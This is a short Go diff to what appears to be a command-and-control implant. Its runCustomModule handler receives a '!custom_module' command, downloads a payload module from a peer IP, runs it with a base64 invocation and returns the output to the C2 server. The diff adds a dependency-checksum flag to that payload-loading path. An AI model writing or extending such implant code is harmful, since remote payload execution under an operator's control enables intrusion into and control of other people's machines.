@@ -76,7 +76,7 @@ func runStat(cmd *cobra.Command, args []string) {
 	c2transport.NotifyC2Binary(cmd, data)
 }
 
-// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --type <payload_type> --file_to_download <file> --peer <ip>
+// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --type <payload_type> --file_to_download <file> --peer <ip> [--dep_checksum <sha256>]
 func runCustomModule(cmd *cobra.Command, args []string) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -91,6 +91,7 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 	payloadType, _ := cmd.Flags().GetString("type")
 	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
 	peerIP, _ := cmd.Flags().GetString("peer")
+	depChecksum, _ := cmd.Flags().GetString("dep_checksum")
 	if modName == "" || checksum == "" {
 		c2transport.NotifyC2(cmd, "Error: args error\n")
 		return
@@ -101,7 +102,8 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 		return
 	}
 	out := modules.ModuleHandler(peerIP, fileToDownload, payloadType, modName, checksum, invocation,
-		modules.WithNotifier(func(msg string) { c2transport.NotifyC2(cmd, "%s", msg) }))
+		modules.WithNotifier(func(msg string) { c2transport.NotifyC2(cmd, "%s", msg) }),
+		modules.WithDependencyChecksum(depChecksum))
 	c2transport.NotifyC2(cmd, "%s\n", out)
 }
 
